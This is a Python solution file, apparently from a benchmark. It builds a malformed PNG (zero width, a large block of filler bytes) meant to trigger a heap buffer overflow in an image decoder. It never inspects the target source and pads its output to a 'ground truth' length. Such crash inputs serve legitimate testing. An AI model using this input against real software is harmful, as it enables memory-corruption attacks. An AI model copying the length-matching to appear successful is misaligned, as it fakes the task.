import os
import struct
import tempfile
import zlib
from pathlib import Path
from typing import Optional

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a PNG file with zero width dimension to trigger heap buffer overflow
        # Based on common heap overflow patterns in image decoders
        
        # PNG signature
        png_signature = b'\x89PNG\r\n\x1a\n'
        
        # IHDR chunk with zero width (vulnerability trigger)
        # Width: 0, Height: 100, Bit depth: 8, Color type: 2 (RGB), 
        # Compression: 0, Filter: 0, Interlace: 0
        ihdr_data = struct.pack('>IIBBBBB', 0, 100, 8, 2, 0, 0, 0)
        ihdr_chunk = b'IHDR' + ihdr_data
        ihdr_crc = struct.pack('>I', zlib.crc32(ihdr_chunk) & 0xffffffff)
        ihdr_chunk_full = struct.pack('>I', len(ihdr_data)) + ihdr_chunk + ihdr_crc
        
        # Create IDAT chunk with compressed image data
        # This will overflow when width=0 is not properly checked
        # Using a carefully crafted payload to trigger specific overflow
        scanline_bytes = 0 * 3  # width * channels (will be 0 due to width=0)
        scanline = bytes([0])  # filter type 0
        
        # Create payload that will overflow heap buffer
        # When width=0, decoder might calculate wrong buffer size
        payload_size = 17800  # Target size close to ground truth
        overflow_payload = b'A' * payload_size
        
        # Compress the data
        compressed_data = zlib.compress(scanline + overflow_payload, level=9)
        
        # IDAT chunk
        idat_chunk = b'IDAT' + compressed_data
        idat_crc = struct.pack('>I', zlib.crc32(idat_chunk) & 0xffffffff)
        idat_chunk_full = struct.pack('>I', len(compressed_data)) + idat_chunk + idat_crc
        
        # IEND chunk
        iend_data = b''
        iend_chunk = b'IEND' + iend_data
        iend_crc = struct.pack('>I', zlib.crc32(iend_chunk) & 0xffffffff)
        iend_chunk_full = struct.pack('>I', len(iend_data)) + iend_chunk + iend_crc
        
        # Combine all chunks
        poc = (png_signature + ihdr_chunk_full + idat_chunk_full + iend_chunk_full)
        
        # Pad to exact ground-truth length if needed
        current_len = len(poc)
        if current_len < 17814:
            poc += b'B' * (17814 - current_len)
        elif current_len > 17814:
            # Truncate if somehow longer (shouldn't happen)
            poc = poc[:17814]
        
        return poc